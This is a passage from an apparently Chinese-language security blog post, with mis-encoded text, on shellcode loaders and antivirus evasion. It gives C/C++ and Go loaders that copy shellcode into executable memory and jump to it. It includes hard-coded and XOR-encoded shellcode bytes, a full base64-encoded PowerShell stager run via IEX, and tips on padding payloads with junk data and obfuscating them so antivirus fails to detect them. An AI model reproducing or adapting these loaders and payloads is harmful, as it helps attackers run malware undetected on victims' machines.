shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(void(*)() shellcode</strong> å°†shellcodeè½¬æ¢ä¸ºå‡½æ•°æŒ‡é’ˆï¼ŒæŒ‡å‘voidå½¢å¼çš„å‡½æ•°ï¼Œç„¶åå†é€šè¿‡ä¸€ä¸ª*å¯¹æŒ‡é’ˆè¿›è¡Œå–å€¼ï¼Œä¹‹åé€šè¿‡()åŒæ‹¬å·è°ƒç”¨å‡½æ•°è¿›è€Œæ‰§è¡Œshellä»è€Œæ‰§è¡Œshellocdeã€‚</p><h4 id="åŠ¨æ€å†…å­˜åŠ è½½"><a href="#åŠ¨æ€å†…å­˜åŠ è½½" class="headerlink" title="åŠ¨æ€å†…å­˜åŠ è½½"></a>åŠ¨æ€å†…å­˜åŠ è½½</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> *Memory; </span><br><span class="line"></span><br><span class="line"> Memory=<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"> ((<span class="built_in">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸç†å’Œä¸Šé¢pythonå®ç°ç±»ä¼¼ã€‚</p><h4 id="å†…è”æ±‡ç¼–æŒ‡ä»¤"><a href="#å†…è”æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="å†…è”æ±‡ç¼–æŒ‡ä»¤"></a>å†…è”æ±‡ç¼–æŒ‡ä»¤</h4><p>æ±‡ç¼–æŒ‡ä»¤ç›¸å…³çš„çŸ¥è¯†å¯ä»¥çœ‹è¿™é‡Œ:</p><p><a href="https://www.cxyzjd.com/article/Hkenter/2855771">https://www.cxyzjd.com/article/Hkenter/2855771</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)  // éšè—æ§åˆ¶å°çª—å£æ˜¾ç¤º</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/INCREMENTAL:NO&quot;</span>)                                     <span class="comment">// å‡å°ç¼–è¯‘ä½“ç§¯</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)                                 <span class="comment">// å¯ç”¨æ•°æ®æ®µå¯è¯»å†™</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xd9\xc5\xd9\x74\x24\xf4\xba\x8b\xfc\x02\xdd\x5e\x2b\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x9f\x1e\xf7\x21\x77\x5c&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\xd9\x87\x01\x70\x3c\xb6\x01\xe6\x34\xe8\xb1\x6c\x18\x04&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\x20\x89\x9f\x4f\xed\xbe\x28\xe5\xcb\xf1\xa9\x56\x2f\x93&quot;</span></span><br><span class="line"><span class="string">&quot;\xca\xec\x3f\xcd\x34\xa2\x40\xc4&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  mov eax, offset shellcode;</span><br><span class="line">  JMP EAX</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä»–å†™æ³•</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunShellCode</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    __asm  </span><br><span class="line">        &#123;  </span><br><span class="line">        lea eax, shellcode;  </span><br><span class="line">    jmp eax;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MOV EAX, offset shellcode</strong><font style="color:rgb(52, 73, 94);background-color:rgb(254, 254, 254);"><br></font>æ­¤æŒ‡ä»¤æ„ä¸ºå°† shellcode æ”¾å…¥åˆ°å¯„å­˜å™¨ EAX ä¸­</p><p><strong>JMP EAX</strong><font style="color:rgb(52, 73, 94);background-color:rgb(254, 254, 254);"><br></font>æ— æ¡ä»¶è·³è½¬åˆ°EAX</p><h4 id="ä¼ªæŒ‡ä»¤"><a href="#ä¼ªæŒ‡ä»¤" class="headerlink" title="ä¼ªæŒ‡ä»¤"></a>ä¼ªæŒ‡ä»¤</h4><p>ä¼ªæŒ‡ä»¤(Pseudo Instruction)æ˜¯ç”¨äºå¯¹æ±‡ç¼–è¿‡ç¨‹è¿›è¡Œæ§åˆ¶çš„æŒ‡ä»¤ï¼Œè¯¥ç±»æŒ‡ä»¤å¹¶ä¸æ˜¯å¯æ‰§è¡ŒæŒ‡ä»¤ï¼Œæ²¡æœ‰æœºå™¨ä»£ç ï¼Œåªç”¨äºæ±‡ç¼–è¿‡ç¨‹ä¸­ä¸ºæ±‡ç¼–ç¨‹åºæä¾›æ±‡ç¼–ä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œæä¾›å¦‚ä¸‹ä¿¡æ¯ï¼šå“ªäº›æ˜¯æŒ‡ä»¤ã€å“ªäº›æ˜¯æ•°æ®åŠæ•°æ®çš„å­—é•¿ã€ç¨‹åºçš„èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ç­‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunShellCode_5</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    __asm  </span><br><span class="line">    &#123;  </span><br><span class="line">        mov eax, offset shellcode;  </span><br><span class="line">        _emit <span class="number">0xFF</span>;  </span><br><span class="line">        _emit <span class="number">0xE0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="goåŠ è½½å™¨"><a href="#goåŠ è½½å™¨" class="headerlink" title="goåŠ è½½å™¨"></a>goåŠ è½½å™¨</h3><p><a href="https://www.cnblogs.com/newbe3three/p/16214882.html">https://www.cnblogs.com/newbe3three/p/16214882.html</a></p><p><a href="https://cn-sec.com/archives/981565.html">https://cn-sec.com/archives/981565.html</a></p><h4 id="åŠ¨æ€å†…å­˜åŠ è½½-1"><a href="#åŠ¨æ€å†…å­˜åŠ è½½-1" class="headerlink" title="åŠ¨æ€å†…å­˜åŠ è½½"></a>åŠ¨æ€å†…å­˜åŠ è½½</h4><p>æ ¸å¿ƒä»£ç å¦‚ä¸‹:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">package main</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="string">&quot;syscall&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="string">&quot;unsafe&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">const</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">MEM_COMMIT             = <span class="number">0x1000</span></span></span></span><br><span class="line"><span class="params"><span class="function">MEM_RESERVE            = <span class="number">0x2000</span></span></span></span><br><span class="line"><span class="params"><span class="function">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// åŒºåŸŸå¯ä»¥æ‰§è¡Œä»£ç ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥è¯»å†™è¯¥åŒºåŸŸã€‚</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">var</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">VirtualAlloc  = kernel<span class="number">32.</span>MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">xor_shellcode := []byte&#123;<span class="number">0x89</span>, <span class="number">0x3d</span>, <span class="number">0xf6</span>, <span class="number">0x91</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xb9</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0x44</span>, <span class="number">0xa7</span>, <span class="number">0x10</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>, <span class="number">0x27</span>, <span class="number">0x15</span>, <span class="number">0x3d</span>, <span class="number">0xfe</span>...&#125;</span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.<span class="built_in">Call</span>(<span class="number">0</span>, <span class="built_in">uintptr</span>(<span class="built_in">len</span>(xor_shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != nil &amp;&amp; err.<span class="built_in">Error</span>() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.<span class="built_in">Exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err = RtlCopyMemory.<span class="built_in">Call</span>(addr, (uintptr)(unsafe.<span class="built_in">Pointer</span>(&amp;xor_shellcode[<span class="number">0</span>])), <span class="built_in">uintptr</span>(<span class="built_in">len</span>(xor_shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != nil &amp;&amp; err.<span class="built_in">Error</span>() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.<span class="built_in">Exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.<span class="built_in">Syscall</span>(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> å…¶å®åŸç†ä¸ä¸Šé¢pythonæˆ–è€…C&#x2F;C++ç±»ä¼¼ã€‚</p><p>é€šè¿‡å£°æ˜åŒ¿åå‡½æ•°,ç„¶åæŒ‡å‘è¯»å…¥çš„ShellCodeå­—èŠ‚æ•°æ®çš„é‚£ç‰‡å†…å­˜ï¼Œå¹¶å°†å†…å­˜è®¾ç½®ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œä¹‹åè°ƒç”¨å‡½æ•°å°±å°†ShellCodeè¿è¡Œèµ·æ¥äº†ã€‚</p><p>å¯ä»¥åˆ©ç”¨åŠ å¯†æ··æ·†shellcodeï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ä¸åŒçš„åŠ è½½å™¨ä»£ç å»å†™åŠ è½½å™¨ã€ã€</p><p>åŠ å£³å·¥å…·ï¼ˆSafengineShieldenï¼‰</p><h4 id="å†…è”CåŠ è½½"><a href="#å†…è”CåŠ è½½" class="headerlink" title="å†…è”CåŠ è½½"></a>å†…è”CåŠ è½½</h4><p>æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    buf := <span class="string">&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span></span><br><span class="line">    ...çœç•¥...</span><br><span class="line">    buf += <span class="string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="built_in">byte</span>(buf)</span><br><span class="line">    C.<span class="built_in">call</span>((*C.<span class="type">char</span>)(unsafe.<span class="built_in">Pointer</span>(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>æ‰‹å·¥æ··æ·†ï¼š</p><p>å¡«å……åƒåœ¾æ•°æ®</p><p>ç›´æ¥åœ¨base64ç¼–ç ä¸Šæ·»åŠ ï¼Œç„¶åè§£ç å‰è¿›è¡Œè¿˜åŸï¼ˆä¸ºäº†è®©æ€æ¯’åˆ¤æ–­å¤±æ•ˆï¼‰</p><p>ç›´æ¥åœ¨åŸå‹ä»£ç ä¸Šæ·»åŠ ï¼Œç„¶åè§£ç è¿˜åŸï¼ˆå¯è¿‡ç«ç»’ï¼‰ </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0RE1pTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNZEVkcGRDUHBpT3BMK0syTmJQYmk3dEtzYUpQRXhPMXBOQ1hyTjI1Tlo1SWdGUFdxU1lNdmtwZ0lYdTNENEI4S2tXaTc1WlhtQ2gzVFJEZjUrY1pORTFQWEFOaTVHNUhLdW5TYTZFVXNJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM1JLVFJVWEdBTmJGUmNZQTNkUlNrZEdUVmNNRmcwVEdBTnVZbUoyR0FOdGN4TWJDaTRwSTZhV3gzU1R3Q1YxVFBVbTcyWVpDa2p0WlB3VnJHeUtvcnNWRmIybzlkRTM3Y3BXaW1WbElSNU94SXBRWGdOVGZsLzVNVHVaQkZYRnJVTlpZWWdreld1T3NMb2t2Q0JjZUJuWE13MStpVWRublFqRnpLRGhJZklyMDN4bGlGYm1Kaksrb1h6MTJGZEt3WmVubUtWeHZKV0lQQXJsLzU3S1RDVjdSQnJ2RENVUlIyM0NQK3RnNGo2eXdCRjJ1bFNmcWkwT1Z0THVIbnkwQnNXcTJHbFkyNUQ5UVdQbW94WkdZUElhSTYyeG5zVW5IVjVaTmhPb1BuS055cVA5Y2VuZVU5YlpDQVp2dzJKYzNTTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNGeEFORWhBYkRSRVVEUklSSTJxMUlmRT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$z</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$DoIt</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$z</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$z</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bb</span>=[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x</span>))</span><br><span class="line">powershell <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> hr.ps1</span><br><span class="line"></span><br><span class="line">å¡«å……åƒåœ¾æ•°æ®</span><br><span class="line">ç›´æ¥åœ¨base64ç¼–ç ä¸Šæ·»åŠ ï¼Œç„¶åè§£ç å‰è¿›è¡Œè¿˜åŸï¼ˆä¸ºäº†è®©æ€æ¯’åˆ¤æ–­å¤±æ•ˆï¼‰</span><br><span class="line">ç›´æ¥åœ¨åŸå‹ä»£ç ä¸Šæ·»åŠ ï¼Œç„¶åè§£ç è¿˜åŸ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">é¡¹ç›®æ··æ·†ï¼š<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">https://github.com/danielbohannon/<span class="built_in">Invoke-Obfuscation</span></span><br><span class="line">åŠ è½½æ¨¡å—ï¼š<span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line">è¿è¡Œç¨‹åºï¼š<span 